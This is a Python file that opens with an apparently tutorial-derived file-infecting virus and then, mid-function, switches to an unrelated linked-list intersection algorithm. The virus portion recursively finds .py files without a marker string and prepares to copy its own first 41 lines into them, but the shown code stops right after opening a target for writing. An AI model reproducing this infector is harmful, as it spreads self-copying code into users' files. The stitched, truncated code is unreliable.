#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# defining a node for LinkedList
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


def getIntersectionNode(head1, head2):

    # finding the total number of elements in head1 LinkedList
    c1 = getCount(head1)

    # finding the total number of elements in head2 LinkedList
    c2 = getCount(head2)

    # Traverse the bigger node by 'd' so that from that node onwards, both LinkedList
    # would be having same number of nodes and we can traverse them together.
    if c1 > c2:
        d = c1-c2
        return _getIntersectionNode(d, head1, head2)
    else:
        d = c2-c1
        return _getIntersectionNode(d, head2, head1)


def _getIntersectionNode(d, head1, head2):

    current1 = head1
    current2 = head2

    for i in range(d):
        if current1 is None:
            return -1
        current1 = current1.next

    while current1 is not None and current2 is not None:

        # Instead of values, we need to check if there addresses are same
        # because there can be a case where value is same but that value is
        # not an intersecting point.
        if current1 is current2:
            return current1.data  # or current2.data ( the value would be same)

        current1 = current1.next
        current2 = current2.next

    # Incase, we are not able to find our intersecting point.
    return -1

# Function to get the count of a LinkedList


def getCount(node):
    cur = node
    count = 0
    while cur is not None:
        count += 1
        cur = cur.next
    return count


if __name__ == '__main__':
    # Creating two LinkedList
    # 1st one: 3->6->9->15->30
    # 2nd one: 10->15->30
    # We can see that 15 would be our intersection point

    # Defining the common node

    common = Node(15)

    # Defining first LinkedList

    head1 = Node(3)
    head1.next = Node(6)
    head1.next.next = Node(9)
    head1.next.next.next = common
    head1.next.next.next.next = Node(30)

    # Defining second LinkedList

    head2 = Node(10)
    head2.next = common
    head2.next.next = Node(30)

    print("The node of intersection is ", getIntersectionNode(head1, head2))

    # The code is contributed by Ansh Gupta.
    # Time Complexity: O(m+n)
    # Space Complexity: O(1)